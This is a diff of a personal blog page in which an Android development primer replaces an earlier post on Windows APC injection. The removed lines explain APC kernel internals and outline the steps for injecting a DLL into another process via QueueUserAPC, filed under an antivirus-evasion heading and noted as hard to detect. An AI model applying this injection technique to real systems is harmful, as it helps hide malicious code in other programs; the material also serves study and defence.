@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="免杀," />
+  <meta name="keywords" content="Android," />
 
 
 
@@ -79,21 +79,22 @@
 
 
 
-<meta name="description" content="APC即异步过程调用，是指函数在特定线程中被异步执行，在操作系统中，APC是一种并发机制。由于线程是不能被杀掉，挂起，恢复的，线程在执行时会占据CPU，而APC注入可以改变一个线程的行为，可用于DLL注入。">
+<meta name="description" content="​	应某些需要，陆陆续续学了一些Android开发的知识一直没好好整理，最近刚好得闲，于是梳理一下，打算弄一个系列，希望自己能坚持下来。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="APC注入">
-<meta property="og:url" content="https://etranfire.github.io/2023/09/12/APC%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:title" content="Android应用简介">
+<meta property="og:url" content="https://etranfire.github.io/2024/04/08/Android%E5%BA%94%E7%94%A8%E7%AE%80%E4%BB%8B/index.html">
 <meta property="og:site_name" content="Etranfire&#39;s blog">
-<meta property="og:description" content="APC即异步过程调用，是指函数在特定线程中被异步执行，在操作系统中，APC是一种并发机制。由于线程是不能被杀掉，挂起，恢复的，线程在执行时会占据CPU，而APC注入可以改变一个线程的行为，可用于DLL注入。">
+<meta property="og:description" content="​	应某些需要，陆陆续续学了一些Android开发的知识一直没好好整理，最近刚好得闲，于是梳理一下，打算弄一个系列，希望自己能坚持下来。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://etranfire.github.io/images/APC%E6%B3%A8%E5%85%A5/image-20230912111408508.png">
-<meta property="og:image" content="https://etranfire.github.io/images/APC%E6%B3%A8%E5%85%A5/image-20230912111646582.png">
-<meta property="article:published_time" content="2023-09-12T01:37:17.000Z">
-<meta property="article:modified_time" content="2023-09-12T03:28:49.194Z">
+<meta property="og:image" content="https://etranfire.github.io/images/Android%E5%BA%94%E7%94%A8%E7%AE%80%E4%BB%8B/1.png">
+<meta property="og:image" content="https://etranfire.github.io/images/Android%E5%BA%94%E7%94%A8%E7%AE%80%E4%BB%8B/2.jpg">
+<meta property="og:image" content="https://etranfire.github.io/images/Android%E5%BA%94%E7%94%A8%E7%AE%80%E4%BB%8B/3.png">
+<meta property="article:published_time" content="2024-04-08T01:50:53.000Z">
+<meta property="article:modified_time" content="2024-04-14T07:41:20.925Z">
 <meta property="article:author" content="Etranfire">
-<meta property="article:tag" content="免杀">
+<meta property="article:tag" content="Android">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://etranfire.github.io/images/APC%E6%B3%A8%E5%85%A5/image-20230912111408508.png">
+<meta name="twitter:image" content="https://etranfire.github.io/images/Android%E5%BA%94%E7%94%A8%E7%AE%80%E4%BB%8B/1.png">
 
 
 
@@ -123,13 +124,13 @@
 
 
 
-  <link rel="canonical" href="https://Etranfire.github.io/2023/09/12/APC注入/"/>
+  <link rel="canonical" href="https://Etranfire.github.io/2024/04/08/Android应用简介/"/>
 
 
 
 
 
-  <title>APC注入 | Etranfire's blog</title>
+  <title>Android应用简介 | Etranfire's blog</title>
   
 
 
@@ -300,7 +301,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://Etranfire.github.io/2023/09/12/APC%E6%B3%A8%E5%85%A5/">
+    <link itemprop="mainEntityOfPage" href="https://Etranfire.github.io/2024/04/08/Android%E5%BA%94%E7%94%A8%E7%AE%80%E4%BB%8B/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="">
@@ -317,7 +318,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">APC注入</h1>
+          <h1 class="post-title" itemprop="name headline">Android应用简介</h1>
         
 
         <div class="post-meta">
@@ -329,8 +330,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-09-12T09:37:17+08:00">
-                2023-09-12
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2024-04-08T09:50:53+08:00">
+                2024-04-08
               </time>
             
 
@@ -352,8 +353,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index">
-                    <span itemprop="name">免杀基础</span>
+                  <a href="/categories/Android%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index">
+                    <span itemprop="name">Android开发基础</span>
                   </a>
                 </span>
 
@@ -394,64 +395,65 @@
       
 
       
-        <p>APC即异步过程调用，是指函数在特定线程中被异步执行，在操作系统中，APC是一种并发机制。由于线程是不能被杀掉，挂起，恢复的，线程在执行时会占据CPU，而APC注入可以改变一个线程的行为，可用于DLL注入。</p>
+        <p>​	应某些需要，陆陆续续学了一些Android开发的知识一直没好好整理，最近刚好得闲，于是梳理一下，打算弄一个系列，希望自己能坚持下来。</p>
 <span id="more"></span>
 
-<h1 id="一、APC机制"><a href="#一、APC机制" class="headerlink" title="一、APC机制"></a>一、APC机制</h1><h2 id="1-1APC调用的条件"><a href="#1-1APC调用的条件" class="headerlink" title="1.1APC调用的条件"></a>1.1APC调用的条件</h2><p>​		往线程APC队列添加APC，系统会产生一个软中断。在线程下一次被调度的时候，就会执行APC函数，APC有两种形式，由系统产生的APC称为内核模式APC，由应用程序产生的APC被称为用户模式APC。这里介绍一下应用程序的APC，APC是往线程中插入一个回调函数,但是用的APC调用这个回调函数是有条</p>
-<p>件的。</p>
-<p>​		当用户模式 APC 排队时，它排队的线程不会被定向到调用 APC 函数，除非它处于可警告状态。线程在调用SleepEx、SignalObjectAndWait，MsgWaitForMultipleObjectsEx、WaitForMultipleObjectsEx或WaitForSingleObjectEx函数时进入可警告状态。如果在 APC 排队之前等待满足，则线程不再处于可警告等待状态，因此不会执行 APC 函数。但是，APC 仍在排队，因此当线程调用另一个可警告的等待函数时，APC 函数将被执行。</p>
-<h2 id="1-2QueueUserAPC函数"><a href="#1-2QueueUserAPC函数" class="headerlink" title="1.2QueueUserAPC函数"></a>1.2QueueUserAPC函数</h2><p>QueueUserAPC用于添加制定的异步函数调用(回调函数)到执行的线程的APC队列中。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DWORD QueueUserAPC( PAPCFUNCpfnAPC, // APC function,执行函数地址</span><br><span class="line">					HANDLEhThread, // handle to thread，插入APC的线程句柄，句柄必须包含THREAD_SET_CONTEXT 访问权限。</span><br><span class="line">                    ULONG_PTRdwData // APC function parameter，第三个参数表示传递给执行函数的参数</span><br><span class="line">                    );</span><br></pre></td></tr></table></figure>
+<h1 id="Android应用简介"><a href="#Android应用简介" class="headerlink" title="Android应用简介"></a>Android应用简介</h1><h2 id="Android软件堆层"><a href="#Android软件堆层" class="headerlink" title="Android软件堆层"></a>Android软件堆层</h2><p>Android软件堆层（software stack，又名软件叠层）是Linux内核和C&#x2F;C++库的集合，它们通过应用框架（Application Framework）向Android运行时（ART）和应用提供服务和管理接口，如下图所示。</p>
+<p><img src="/images/Android%E5%BA%94%E7%94%A8%E7%AE%80%E4%BB%8B/1.png" alt="1"></p>
+<ul>
+<li>Linux内核——核心服务（包括硬件驱动程序、进程及内存管理、安全、网络和电源管理）由Linux内核提供。</li>
+<li>硬件抽象层（Hardware Abstraction Layer，HAL）——HAL系统在底层物理设备和Android软件堆层的其余部分提供了一个硬件抽象层。</li>
+<li>本地方法库——-本地方法库运行在内核和HAL之上，Android包括各种C&#x2F;C++核心库，如libc和SSL以及以下内容：<ul>
+<li>用于播放音视频的媒体库。</li>
+<li>提供显示管理的界面管理器。</li>
+<li>包含用于2D和3D图形的SGL和OpenGL的图形库。</li>
+<li>用于本地数据库支持的SQLite。</li>
+<li>用于集成Web浏览器和Internet安全的SSL和WebKit。</li>
+</ul>
+</li>
+<li>Android运行时（ART）——Android没用使用传统的Java VM（如Java ME），而是使用自主设计的运行时，以此确保可以在一台设备上同时高效地运行多个实例。ART使用设备的底层Linux内核处理底层功能，作为中间层对所有Android硬件和系统服务的访问提供了统一的管理。ART执行的是Dalvik可执行程序（.dex）。</li>
+<li>应用框架——–应用框架提供了用于构建Android应用的类。它还为硬件访问提供通用的抽象层，并管理用户界面和应用资源。</li>
+<li>应用层——–所有应用，无论是系统自带的还是第三方的，都是通过应用层提供的完全相同的API构建而成的。应用层则通过使用应用层提供的类和服务，最终运行在Android运行时中。</li>
+</ul>
+<p>查阅Android用于开发的API，可以通过该网址查阅<a target="_blank" rel="noopener" href="https://developer.android.com/reference/packages">Android API查阅</a>;</p>
+<h2 id="Android应用的组件"><a href="#Android应用的组件" class="headerlink" title="Android应用的组件"></a>Android应用的组件</h2><ul>
+<li>Activity，应用的表现层。应用的UI是围绕一个或多个Activity类的拓展构建的。</li>
+<li>Service，Service组件在没有UI的情况下运行、更新数据源、触发通知和广播意图。</li>
+<li>Intent，应用间消息传递框架。</li>
+<li>Broadcast Receiver，用于接收广播Intent；</li>
+<li>Content Provider，Content Provider是跨应用共享数据的首选方案。</li>
+<li>Notification，在不窃取焦点或者中断当前活动界面的情况下提醒用户注意应用事件。</li>
+</ul>
+<h2 id="Android应用的生命周期、优先级和进程状态"><a href="#Android应用的生命周期、优先级和进程状态" class="headerlink" title="Android应用的生命周期、优先级和进程状态"></a>Android应用的生命周期、优先级和进程状态</h2><h3 id="优先级"><a href="#优先级" class="headerlink" title="优先级"></a>优先级</h3><p>杀死进程以回收资源的顺序由应用的优先级决定。应用的优先级又等于优先级最高组件的优先级。如果两个应用具有相同的优先级，那么运行时间最长的进程通常会被杀死。进程优先级也会受到进程间依赖关系的影响。如果一个应用依赖于另一个应用提供的Service或Content Provider，那么为辅助应用分配的优先级至少要与支持的应用相同。优先级有如下：</p>
+<ul>
+<li>活动进程（最高优先级），活动（前台）进程具有用户正在交互的应用组件。活动进程包括一个或多个以下组件。<ul>
+<li>处于活动状态的Activity，处于前台并响应用户事件的Activity。</li>
+<li>执行onReceive事件处理程序的广播接收者（Broadcast Provider）。</li>
+<li>执行onStart、onCreate或者onDestroy方法来处理事件的Service组件。</li>
+</ul>
+</li>
+<li>可见进程（高优先级），可见但不活动的进程托管了可见Activity或前台Service。</li>
+<li>已启动的后台服务进程（中等优先级），托管了已启动的后台Service的进程。</li>
+<li>后台进程（低优先级），托管了不可见且没有任何Service正在运行的Activity进程。</li>
+</ul>
+<h3 id="Activity状态与生命周期"><a href="#Activity状态与生命周期" class="headerlink" title="Activity状态与生命周期"></a>Activity状态与生命周期</h3><p>Activity状态如下：</p>
+<ul>
+<li>活动状态，当Activity位于栈顶时，它对于用户输入而言是一个可见且拥有焦点的前台Activity。</li>
+<li>暂停状态，在某些情况下，Activity虽然可见，但它没有获得焦点。</li>
+<li>停止状态，当一个Activity不可见时，它就进入了停止状态。</li>
+<li>不活动状态，一个Activity在被杀死之后到被启动之前，都处于不活动状态。</li>
+</ul>
+<p>Activtiy生命周期如下：</p>
+<p><img src="/images/Android%E5%BA%94%E7%94%A8%E7%AE%80%E4%BB%8B/2.jpg" alt="2"></p>
+<h3 id="Fragment生命周期"><a href="#Fragment生命周期" class="headerlink" title="Fragment生命周期"></a>Fragment生命周期</h3><p>fragment生命周期如下：</p>
+<p><img src="/images/Android%E5%BA%94%E7%94%A8%E7%AE%80%E4%BB%8B/3.png" alt="3"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BlankFragment</span> <span class="keyword">extends</span> <span class="title class_">Fragment</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ARG_PARAM1</span> <span class="operator">=</span> <span class="string">&quot;param1&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ARG_PARAM2</span> <span class="operator">=</span> <span class="string">&quot;param2&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> String mParam1;</span><br><span class="line">    <span class="keyword">private</span> String mParam2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BlankFragment</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// Required empty public constructor</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> BlankFragment <span class="title function_">newInstance</span><span class="params">(String param1, String param2)</span> &#123;</span><br><span class="line">        <span class="type">BlankFragment</span> <span class="variable">fragment</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BlankFragment</span>();</span><br><span class="line">        <span class="type">Bundle</span> <span class="variable">args</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bundle</span>();</span><br><span class="line">        args.putString(ARG_PARAM1, param1);</span><br><span class="line">        args.putString(ARG_PARAM2, param2);</span><br><span class="line">        fragment.setArguments(args);</span><br><span class="line">        <span class="keyword">return</span> fragment;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onAttach</span><span class="params">(<span class="meta">@NonNull</span> Context context)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onAttach(context);</span><br><span class="line">        <span class="comment">//获取一个代表父类控件的引用onAttach()在fragment与Activity关联之后调用。需要注意的是，初始化fragment参数可以从getArguments()获得，</span></span><br><span class="line">        <span class="comment">// 但是，当Fragment附加到Activity之后，就无法再调用setArguments()。所以除了在最开始时，其它时间都无法向初始化参数添加内容</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//在Fragment进行初始化创建时调用</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="keyword">if</span> (getArguments() != <span class="literal">null</span>) &#123;</span><br><span class="line">            mParam1 = getArguments().getString(ARG_PARAM1);</span><br><span class="line">            mParam2 = getArguments().getString(ARG_PARAM2);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//初始化fragment</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//每当fragment开始创建用户界面时调用</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> View <span class="title function_">onCreateView</span><span class="params">(LayoutInflater inflater, ViewGroup container,</span></span><br><span class="line"><span class="params">                             Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="comment">// Inflate the layout for this fragment</span></span><br><span class="line">        <span class="keyword">return</span> inflater.inflate(R.layout.fragment_blank, container, <span class="literal">false</span>);</span><br><span class="line">        <span class="comment">//创建并膨胀fragment的UI，然后返回UI的View对象，如果fragment没有UI则返回null</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//可见的生命周期开始时调用</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onStart</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onStart();</span><br><span class="line">        <span class="comment">//此时fragment已经可见，可以应用任何必要的UI更改了。</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//活动的生命周期开始时调用</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onResume</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onResume();</span><br><span class="line">        <span class="comment">//恢复Fragment需要的，但由于进入非活动状态而暂停的所有UI更新、线程或者进程。</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//活动的生命周期结束时调用</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onPause</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onPause();</span><br><span class="line">        <span class="comment">//挂载那些Activity不处于前台活动状态时，就不需要UI更新、线程或者密集的CPU进程</span></span><br><span class="line">        <span class="comment">//由于在该方法调用之后，进程有被杀死的可能性，</span></span><br><span class="line">        <span class="comment">//因此需要做好编辑内容及状态改变的持久化。</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//调用该方法。活动的生命周期结束时，保存UI的状态改变</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onSaveInstanceState</span><span class="params">(<span class="meta">@NonNull</span> Bundle outState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onSaveInstanceState(outState);</span><br><span class="line">        <span class="comment">//将UI状态的变化保存在saveInstanceState实例中。</span></span><br><span class="line">        <span class="comment">//如果父Activity被杀死并重启，那么之歌Bundle实例将会被传给onCreate、onCreateView和onActivityCreated方法</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//在可见的生命周期结束时调用</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onStop</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onStop();</span><br><span class="line">        <span class="comment">//挂载那些在fragment不可见时不需要的UI更新、线程和进程</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//当fragment的view被分离时调用</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onDestroyView</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onDestroyView();</span><br><span class="line">        <span class="comment">//清除与视图相关的资源</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//在完整的生命周期结束时调用</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onDestroy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onDestroy();</span><br><span class="line">        <span class="comment">//清理所有资源，包括结束进程、关闭数据库链接等</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//当fragment与父Activity分离时调用</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onDetach</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onDetach();</span><br><span class="line">        <span class="comment">//清理对父类的所有引用，包括对其他View或者类的引用</span></span><br><span class="line">        <span class="comment">//通常将这些引用设置为null</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h2 id="1-3APC队列"><a href="#1-3APC队列" class="headerlink" title="1.3APC队列"></a>1.3APC队列</h2><p>APC是针对具体线程，由具体线程加以执行的，所以每个线程都有自己的APC队列。内核中代表着线程的数据结构是ETHREAD，而ETHREAD中的第一个成分Tcb 是KTHREAD数据结构，线程的APC队列就在KTHREAD里面。</p>
-<p>KTHREAD + 0x34 处是一个 _KAPC_STATE 结构：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _KTHREAD</span><br><span class="line">...</span><br><span class="line">+0x034 ApcState         : _KAPC_STATE</span><br></pre></td></tr></table></figure>
+<h3 id="Fragment-Manager和Fragment-Transaction"><a href="#Fragment-Manager和Fragment-Transaction" class="headerlink" title="Fragment  Manager和Fragment Transaction"></a>Fragment  Manager和Fragment Transaction</h3><p>每个Activity都有一个Fragment Manager，用于管理它所包含的Fragment。而Fragment Tansaction则用于添加、删除和替换Fragment。用例如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">FragmentManager fragmentManager=getSupportFragmentManager();</span><br><span class="line">FragmentTransaction fragmentTransaction=fragmentManager.beginTransaction();</span><br><span class="line"><span class="comment">//添加、移除或替换Fragment</span></span><br><span class="line"><span class="comment">//描述动画</span></span><br><span class="line"><span class="comment">//如果需要，添加到回退栈。</span></span><br><span class="line">fragmentTransaction.commitNow();</span><br><span class="line"><span class="comment">//commit方法以异步的形式添加到UI队列中，commitNow方法阻断线程，直到事务完成。</span></span><br></pre></td></tr></table></figure>
 
-<p>_KAPC_STATE的结构如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _KAPC_STATE </span><br><span class="line">nt!_KAPC_STATE </span><br><span class="line">+0x000 ApcListHead //2个APC队列 用户APC和内核APC</span><br><span class="line">+0x010 Process //线程所属或者所挂靠的进程</span><br><span class="line">+0x014 KernelApcInProgress //内核APC是否正在执行</span><br><span class="line">+0x015 KernelApcPending //是否有正在等待执行的内核APC</span><br><span class="line">+0x016 UserApcPending //是否有正在等待执行的用户APC</span><br><span class="line"></span><br><span class="line">用户APC：APC函数地址位于用户空间，在用户空间执行</span><br><span class="line"></span><br><span class="line">内核APC：APC函数地址位于内核空间，在内核空间执行（分为NormalRoutine为NULL的SpecialKernelApc和不为NULL的NormalKernelApc。SpecialKernelApc只执行KernelRoutine，IRQL为APC_LEVEL，而NormalKernelApc不仅仅执行 KernelRoutine还执行NormalRoutine，在PASSIVE_LEVEL下执行NormalRoutine。）</span><br></pre></td></tr></table></figure>
-
-<p>NormalRoutine 会找到你提供的APC函数，并不完全等于APC函数的地址。</p>
-<h2 id="1-4APC函数执行流程"><a href="#1-4APC函数执行流程" class="headerlink" title="1.4APC函数执行流程"></a>1.4APC函数执行流程</h2><h3 id="1-4-1相关函数"><a href="#1-4-1相关函数" class="headerlink" title="1.4.1相关函数"></a>1.4.1相关函数</h3><p>KiServiceExit函数：这个函数是系统调用、异常或中断返回用户空间的必经之路。</p>
-<p>KiDeliverApc函数：负责执行APC函数</p>
-<h3 id="1-4-2QueueUserApc"><a href="#1-4-2QueueUserApc" class="headerlink" title="1.4.2QueueUserApc"></a>1.4.2QueueUserApc</h3><p>(1)通过3环的QueueUserApc函数可以完成将APC插入到队列的操作，首先调用了 ntdll.dll 的 NtQueueApcThread。</p>
-<p>(2)然后通过 0xB4 的调用号进入ring0。在windbg里面对应的内核函数为 NtQueueApcThread。</p>
-<p>(3)然后在 ntosknl.exe 里面定位到 NtQueueApcThread.</p>
-<p>(4)最后是调用 KeInitializeApc(对KAPC结构体进行初始化) 和 KeInsertQueueApc 这两个函数来实现APC的效果。</p>
-<h3 id="1-4-3用户APC"><a href="#1-4-3用户APC" class="headerlink" title="1.4.3用户APC"></a>1.4.3用户APC</h3><p>当产生系统调用、中断或者异常，线程在返回用户空间前都会调用 KiServiceExit 函数，在KiServiceExit 会判断是否有要执行的用户APC，如果有则调用KiDeliverApc 函数(第一个参数为1)进行处理。涉及的换栈操作如下：</p>
-<p>（1）当线程从用户层进入内核层时，要保留原来的运行环境，比如各种寄存器，栈的位置等等( _Trap_Frame )，然后切换成内核的堆栈，如果正常返回，恢复堆栈环境即可。用来保存原始环境的数据结构为SavedApcState。</p>
-<p>（2）但如果有用户APC要执行的话，就意味着线程要提前返回到用户空间去执行，而且返回的位置不是线程进入内核时的位置，而是返回到其他的位置，每处理一个用户APC都会涉及到：内核–&gt;用户空间–&gt;再回到内核空间。</p>
-<p>线程进0环时，原来的运行环境(寄存器栈顶等)保存到 _Trap_Frame 结构体中，如果要提前返回3环去处理用户APC，就必须要修改 _Trap_Frame 结构体。处理完APC后该如何返回原来的位置？</p>
-<p>KiInitializeUserApc 要做的第一件事就是备份，将原来 _Trap_Frame 的值备份到一个新的结构体中( CONTEXT )，这个功能由其子函数KeContextFromKframes 来完成。具体操作如下:</p>
-<p>1.首先判断参数是否为1，当参数为1的时候处理用户APC。再判断Apcstate.UserApcPending是否为1，为1则有用户APC要执行。</p>
-<p>2.将ApcState.UserApcPending设置为0.</p>
-<p>3.链表操作，将当前APC从用户队列中移除。</p>
-<p>4.调用函数(KAPC.KernelRoutine)释放KAPC结构内存空间</p>
-<p>5.转到 KiInitializeUserApc 函数，将 CONTEXT 和 TrapFrame 传入 KeContextFromKframes</p>
-<p>6.当windows把 CONTEXT 结构复制到堆栈之后，准备用户层执行环境，首先修改SS、DS、ES、FS、GS和EFLAGS寄存器</p>
-<p>7.然后修改esp到3环堆栈</p>
-<p>8.然后修改eip，这里永远返回一个固定的位置，但是这个位置在每次系统启动的时候都不相同，存放在3环的 ntdll 里的 KiUserApcDispatcher 参数里面</p>
-<p>9.然后到ntdll里面定位到 KiUserApcDispatcher ，首先得到指向 CONTEXT 结构的指针，然后 pop eax 得 到 NormalRoutine 结构，这里当APC是内核APC的时候存储的是真正的APC地址，当APC是用户APC的时候存储的是指向用户APC的总入口。当我们调用 QueueUserAPC ，并没有指定 NormalRoutine 结构，只指定了 NormalContext 和 SystemArgument1 ，那么这个参数在 QueueUserAPC 内部指定，在 kernel32.dll 的 BaseDispatchAPC ，用来调用真正的用户APC函数。</p>
-<p>10.调用ZwContinue 。</p>
-<p>（1）返回内核，如果还有用户APC，重复上面的执行过程。 </p>
-<p>（2）如果没有需要执行的用户APC，会将CONTEXT赋值给Trap_Frame结构体。就像从来没有修改过一样。 ZwContinue后面的代码不会执行，线程从哪里进0环仍然会从哪里回去。</p>
-<p>11.使用 0x20 的调用号利用调用门回到0环。</p>
-<h1 id="二、apc注入"><a href="#二、apc注入" class="headerlink" title="二、apc注入"></a>二、apc注入</h1><h2 id="2-1步骤"><a href="#2-1步骤" class="headerlink" title="2.1步骤"></a>2.1步骤</h2><p>1.当EXE里某个线程执行到SleepEx()或者WaitForSingleObjectEx()时，系统就会产生一个软中断（或者是Messagebox弹窗的时候不点OK的时候也能注入）。</p>
-<p>2.当线程再次被唤醒时，此线程会首先执行APC队列中的被注册的函数。</p>
-<p>3.利用QueueUserAPC()这个API可以在软中断时向线程的APC队列插入一个函数指针，如果我们插入的是Loadlibrary()执行函数的话，就能达到注入DLL的目的。</p>
-<p>在整个执行过程中，线程并无任何异常举动，不容易被察觉，但缺点是对于单线程程序一般不存在挂起状态，所以APC注入对于这类程序没有明显效果。</p>
-<h2 id="2-2流程"><a href="#2-2流程" class="headerlink" title="2.2流程"></a>2.2流程</h2><p>1.OpenProcess 打开进程</p>
-<p>2.VirtualAlloc 申请空间</p>
-<p>3.WriteProcessMemory 写入dll信息</p>
-<p>4.根据进程对应的线程id打开线程</p>
-<p>5.使用 QueueUserApc 插入执行</p>
